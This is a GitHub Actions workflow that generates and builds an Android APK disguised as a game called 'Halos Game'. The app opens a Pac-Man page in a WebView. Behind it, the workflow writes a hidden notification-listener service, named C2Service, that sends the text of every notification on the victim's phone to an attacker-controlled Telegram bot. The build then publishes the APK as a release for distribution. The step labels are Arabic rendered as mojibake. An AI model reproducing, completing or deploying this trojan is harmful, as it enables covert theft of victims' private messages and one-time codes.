name: Hussein V8 The Real Final
on:
  workflow_dispatch:
    inputs:
      bot_token: { required: true }
      chat_id: { required: true }
      app_name: { required: true, default: 'Halos Game' }

permissions: { contents: write }

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: 1. Ø¬Ù„Ø¨ Ø§Ù„ÙƒÙˆØ¯
        uses: actions/checkout@v4
        
      - name: 2. Ø¥Ø¹Ø¯Ø§Ø¯ Ù„ØºØ© Ø¬Ø§ÙØ§
        uses: actions/setup-java@v4
        with: { distribution: 'temurin', java-version: '17' }

      # --- Ù‡Ø°Ø§ Ù‡Ùˆ Ø§Ù„Ø­Ù„ Ø§Ù„Ø³Ø­Ø±ÙŠ Ù„Ù„Ù…Ø´ÙƒÙ„Ø© ---
      - name: 3. Ø¥Ø¬Ø¨Ø§Ø± Ø§Ù„Ø³ÙŠØ±ÙØ± Ø¹Ù„Ù‰ Ø¥ØµØ¯Ø§Ø± Gradle Ù…Ø³ØªÙ‚Ø±
        uses: gradle/actions/setup-gradle@v3
        with:
          gradle-version: '8.4' 
      # -----------------------------------

      - name: 4. Ø¥Ù†Ø´Ø§Ø¡ Ù…Ù„ÙØ§Øª Ø§Ù„Ù…Ø´Ø±ÙˆØ¹ Ø§Ù„Ø£Ø³Ø§Ø³ÙŠØ©
        run: |
          mkdir -p app/src/main/java/com/hussein/v8
          mkdir -p app/src/main/res/values

          echo "include ':app'" > settings.gradle

          cat << 'EOF' > build.gradle
          buildscript {
              repositories { google(); mavenCentral() }
              dependencies { classpath 'com.android.tools.build:gradle:8.1.0' }
          }
          allprojects { repositories { google(); mavenCentral() } }
          EOF

          cat << 'EOF' > app/build.gradle
          plugins { id 'com.android.application' }
          android {
              namespace 'com.hussein.v8'
              compileSdk 34
              defaultConfig {
                  applicationId "com.hussein.v8"
                  minSdk 24
                  targetSdk 34
                  versionCode 1
                  versionName "1.0"
              }
          }
          dependencies {
              implementation "com.squareup.okhttp3:okhttp:4.12.0"
          }
          EOF

      - name: 5. Ø­Ù‚Ù† Ø£ÙƒÙˆØ§Ø¯ Ø§Ù„ØªÙ…ÙˆÙŠÙ‡ ÙˆØ§Ù„ØªÙˆÙƒÙ†
        run: |
          cat << 'EOF' > app/src/main/AndroidManifest.xml
          <?xml version="1.0" encoding="utf-8"?>
          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
              <uses-permission android:name="android.permission.INTERNET" />
              <application android:label="${{ github.event.inputs.app_name }}" android:icon="@android:drawable/star_on">
                  <activity android:name=".MainActivity" android:exported="true">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>
                  <service android:name=".C2Service" android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" android:exported="true">
                      <intent-filter><action android:name="android.service.notification.NotificationListenerService" /></intent-filter>
                  </service>
              </application>
          </manifest>
          EOF

          cat << 'EOF' > app/src/main/java/com/hussein/v8/C2Service.java
          package com.hussein.v8;
          import android.service.notification.NotificationListenerService;
          import android.service.notification.StatusBarNotification;
          import okhttp3.*;
          import java.io.IOException;

          public class C2Service extends NotificationListenerService {
              @Override
              public void onNotificationPosted(StatusBarNotification sbn) {
                  String token = "${{ github.event.inputs.bot_token }}";
                  String chatid = "${{ github.event.inputs.chat_id }}";
                  String msg = "ğŸ¯ ØµÙŠØ¯Ø© Ø¬Ø¯ÙŠØ¯Ø© Ù…Ù† Ø­Ø³ÙŠÙ†!\n" + sbn.getNotification().extras.getCharSequence("android.text");
                  
                  OkHttpClient client = new OkHttpClient();
                  Request req = new Request.Builder()
                      .url("https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chatid + "&text=" + msg)
                      .build();
                  client.newCall(req).enqueue(new Callback() {
                      @Override public void onFailure(Call c, IOException e) {}
                      @Override public void onResponse(Call c, Response r) throws IOException { r.close(); }
                  });
              }
          }
          EOF

          cat << 'EOF' > app/src/main/java/com/hussein/v8/MainActivity.java
          package com.hussein.v8;
          import android.app.Activity;
          import android.os.Bundle;
          import android.webkit.WebView;
          public class MainActivity extends Activity {
              @Override protected void onCreate(Bundle s) {
                  super.onCreate(s);
                  WebView w = new WebView(this);
                  w.getSettings().setJavaScriptEnabled(true);
                  w.loadUrl("https://www.google.com/logos/2010/pacman10-i.html");
                  setContentView(w);
              }
          }
          EOF

      - name: 6. Ø§Ù„Ø¨Ù†Ø§Ø¡ Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠ Ù„Ù„Ù€ APK
        run: gradle assembleDebug

      - name: 7. Ø±ÙØ¹ Ø±Ø§Ø¨Ø· Ø§Ù„ØªØ­Ù…ÙŠÙ„
        uses: softprops/action-gh-release@v1
        with:
          tag_name: V8-Halos-${{ github.run_number }}
          name: ØªØ·Ø¨ÙŠÙ‚ ${{ github.event.inputs.app_name }}
          files: app/build/outputs/apk/debug/*.apk
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
